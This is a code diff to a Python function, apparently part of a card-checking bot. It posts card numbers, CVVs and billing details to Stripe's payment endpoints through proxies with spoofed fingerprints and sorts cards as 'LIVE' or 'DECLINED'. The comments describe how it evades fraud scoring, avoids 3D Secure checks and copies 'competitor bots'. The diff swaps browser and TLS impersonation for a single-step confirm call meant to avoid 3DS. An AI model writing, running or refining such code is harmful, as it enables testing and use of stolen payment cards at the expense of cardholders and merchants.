@@ -1085,177 +1085,66 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
             if attempt > 0:
                 print(f"[DEBUG] Retry attempt {attempt}...")
             
-            # Generate Stripe.js fingerprints (muid persistent per user)
+            # Generate fingerprint IDs (still needed for Stripe API)
             fp = generate_stripe_fingerprints(user_id)
-            time_on_page = random.randint(8000, 90000)  # 8-90 seconds
+            time_on_page = random.randint(8000, 90000)
             eid = generate_eid()
             
-            # Randomize pasted_fields
-            pasted = random.choice(["number", "number", "number", ""])
+            print(f"[DEBUG] Charging via clean API (no browser emulation)...")
             
-            # Retrieve session-consistent UA + origin from checkout_data
-            session_ua = checkout_data.get("session_ua") or random.choice(USER_AGENTS)
-            stripe_origin = checkout_data.get("stripe_origin", "checkout")
+            # --- CLEAN API APPROACH ---
+            # NO browser emulation: no cookies, no telemetry, no sec-ch-ua
+            # This prevents Stripe from detecting as browser → no browser-level 3DS
+            # Competitor bots use this approach — simple API calls
             
-            print(f"[DEBUG] Step 1: Tokenizing card via /v1/payment_methods...")
+            # Minimal headers — NOT browser-like
+            headers = {
+                "accept": "application/json",
+                "content-type": "application/x-www-form-urlencoded",
+                "user-agent": checkout_data.get("session_ua") or random.choice(USER_AGENTS),
+            }
             
-            # --- STEP 1: Create PaymentMethod (tokenize card) ---
-            # This is how real Stripe.js works — card data goes to /v1/payment_methods
-            # Stripe evaluates fraud signals HERE, not at confirm
-            pm_body = (
-                f"type=card"
-                f"&card[number]={card['cc']}"
-                f"&card[cvc]={card['cvv']}"
-                f"&card[exp_month]={card['month']}"
-                f"&card[exp_year]={card['year']}"
-                f"&billing_details[name]={name}"
-                f"&billing_details[email]={email}"
-                f"&billing_details[address][country]={country}"
-                f"&billing_details[address][line1]={line1}"
-                f"&billing_details[address][city]={city}"
-                f"&billing_details[address][postal_code]={zip_code}"
-                f"&billing_details[address][state]={state}"
-                f"&guid={fp['guid']}"
-                f"&muid={fp['muid']}"
-                f"&sid={fp['sid']}"
-                f"&payment_user_agent={get_random_stripe_js_agent()}"
-                f"&time_on_page={time_on_page}"
+            # Single-step confirm with payment_method_data
+            conf_body = (
+                f"eid={eid}"
+                f"&payment_method_data[type]=card"
+                f"&payment_method_data[card][number]={card['cc']}"
+                f"&payment_method_data[card][cvc]={card['cvv']}"
+                f"&payment_method_data[card][exp_month]={card['month']}"
+                f"&payment_method_data[card][exp_year]={card['year']}"
+                f"&payment_method_data[billing_details][name]={name}"
+                f"&payment_method_data[billing_details][email]={email}"
+                f"&payment_method_data[billing_details][address][country]={country}"
+                f"&payment_method_data[billing_details][address][line1]={line1}"
+                f"&payment_method_data[billing_details][address][city]={city}"
+                f"&payment_method_data[billing_details][address][postal_code]={zip_code}"
+                f"&payment_method_data[billing_details][address][state]={state}"
+                f"&payment_method_data[guid]={fp['guid']}"
+                f"&payment_method_data[muid]={fp['muid']}"
+                f"&payment_method_data[sid]={fp['sid']}"
+                f"&payment_method_data[payment_user_agent]={get_random_stripe_js_agent()}"
+                f"&payment_method_data[time_on_page]={time_on_page}"
+                f"&expected_amount={total}"
+                f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
+                f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
+                f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
+                f"&last_displayed_line_item_group_details[total_discount_amount]=0"
+                f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
+                f"&expected_payment_method_type=card"
+                f"&key={pk}"
+                f"&init_checksum={checksum}"
             )
-            if pasted:
-                pm_body += f"&pasted_fields={pasted}"
-            pm_body += f"&key={pk}"
             
-            # Headers with consistent session UA + Stripe cookies
-            headers = get_headers(stripe_js=True, user_agent=session_ua, stripe_origin=stripe_origin)
-            headers["Cookie"] = get_stripe_cookies(fp)
+            confirm_url = f"https://api.stripe.com/v1/payment_pages/{cs}/confirm"
             
-            # Send telemetry beacon BEFORE tokenization (lowers risk score)
-            await send_stripe_telemetry(pk, fp, session_ua, stripe_origin, proxy_url)
-            
-            # Tokenize card via /v1/payment_methods
-            pm_id = None
-            if HAS_CURL_CFFI:
-                try:
-                    async with CurlAsyncSession(impersonate="chrome131") as curl_s:
-                        resp = await curl_s.post(
-                            "https://api.stripe.com/v1/payment_methods",
-                            headers=headers,
-                            data=pm_body,
-                            proxy=proxy_url,
-                            timeout=20,
-                        )
-                        pm_resp = resp.json()
-                except Exception as curl_err:
-                    print(f"[DEBUG] curl_cffi PM failed, fallback: {str(curl_err)[:40]}")
-                    connector = aiohttp.TCPConnector(limit=100, ssl=False)
-                    async with aiohttp.ClientSession(connector=connector) as s:
-                        async with s.post(
-                            "https://api.stripe.com/v1/payment_methods",
-                            headers=headers, data=pm_body, proxy=proxy_url
-                        ) as r:
-                            pm_resp = await r.json()
-            else:
-                connector = aiohttp.TCPConnector(limit=100, ssl=False)
-                async with aiohttp.ClientSession(connector=connector) as s:
-                    async with s.post(
-                        "https://api.stripe.com/v1/payment_methods",
-                        headers=headers, data=pm_body, proxy=proxy_url
-                    ) as r:
-                        pm_resp = await r.json()
-            
-            print(f"[DEBUG] PM Response: {str(pm_resp)[:150]}...")
-            
-            # Check if tokenization failed
-            if "error" in pm_resp:
-                err = pm_resp["error"]
-                dc = err.get("decline_code", "")
-                msg_text = err.get("message", "Token failed")
-                err_code = err.get("code", "")
-                if dc in LIVE_DECLINE_CODES:
-                    result["status"] = "LIVE"
-                elif dc:
-                    result["status"] = "DECLINED"
-                else:
-                    result["status"] = "DECLINED"
-                result["response"] = f"[{dc or err_code}] [{msg_text}]" if (dc or err_code) else msg_text
-                result["time"] = round(time.perf_counter() - start, 2)
-                return result
-            
-            pm_id = pm_resp.get("id")
-            if not pm_id:
-                result["status"] = "ERROR"
-                result["response"] = "No PM token received"
-                result["time"] = round(time.perf_counter() - start, 2)
-                return result
-            
-            print(f"[DEBUG] Step 2: Confirming with token {pm_id[:20]}...")
-            
-            # --- STEP 2: Confirm via PaymentIntent (NOT checkout session) ---
-            # Checkout Session confirm (/v1/payment_pages/) has STRICTER 3DS enforcement
-            # Direct PaymentIntent confirm (/v1/payment_intents/) is more lenient
-            # This is how competitor bots work — they bypass checkout-level 3DS
-            
-            pi_data = init_data.get("payment_intent") or {}
-            pi_id = pi_data.get("id")
-            pi_secret = pi_data.get("client_secret")
-            
-            if pi_id and pi_secret:
-                # Direct PaymentIntent confirm — less strict 3DS
-                print(f"[DEBUG] Using PaymentIntent confirm: {pi_id[:25]}...")
-                conf_body = (
-                    f"payment_method={pm_id}"
-                    f"&expected_payment_method_type=card"
-                    f"&client_secret={pi_secret}"
-                    f"&key={pk}"
-                )
-                confirm_url = f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm"
-            else:
-                # Fallback: Checkout Session confirm (if no PI data)
-                print(f"[DEBUG] Fallback: Checkout Session confirm")
-                conf_body = (
-                    f"eid={eid}"
-                    f"&payment_method={pm_id}"
-                    f"&expected_amount={total}"
-                    f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
-                    f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
-                    f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
-                    f"&last_displayed_line_item_group_details[total_discount_amount]=0"
-                    f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
-                    f"&expected_payment_method_type=card"
-                    f"&key={pk}"
-                    f"&init_checksum={checksum}"
-                )
-                confirm_url = f"https://api.stripe.com/v1/payment_pages/{cs}/confirm"
-            
-            # Use curl_cffi for TLS/JA3 fingerprint impersonation if available
-            if HAS_CURL_CFFI:
-                try:
-                    async with CurlAsyncSession(impersonate="chrome131") as curl_s:
-                        resp = await curl_s.post(
-                            confirm_url,
-                            headers=headers,
-                            data=conf_body,
-                            proxy=proxy_url,
-                            timeout=25,
-                        )
-                        conf = resp.json()
-                except Exception as curl_err:
-                    print(f"[DEBUG] curl_cffi failed, falling back to aiohttp: {str(curl_err)[:40]}")
-                    connector = aiohttp.TCPConnector(limit=100, ssl=False)
-                    async with aiohttp.ClientSession(connector=connector) as s:
-                        async with s.post(
-                            confirm_url,
-                            headers=headers, data=conf_body, proxy=proxy_url
-                        ) as r:
-                            conf = await r.json()
-            else:
-                connector = aiohttp.TCPConnector(limit=100, ssl=False)
-                async with aiohttp.ClientSession(connector=connector) as s:
-                    async with s.post(
-                        confirm_url,
-                        headers=headers, data=conf_body, proxy=proxy_url
-                    ) as r:
-                        conf = await r.json()
+            # Use aiohttp (no TLS impersonation needed — we're NOT pretending to be a browser)
+            connector = aiohttp.TCPConnector(limit=100, ssl=False)
+            async with aiohttp.ClientSession(connector=connector) as s:
+                async with s.post(
+                    confirm_url,
+                    headers=headers, data=conf_body, proxy=proxy_url
+                ) as r:
+                    conf = await r.json()
             
             print(f"[DEBUG] Confirm Response: {str(conf)[:200]}...")
             
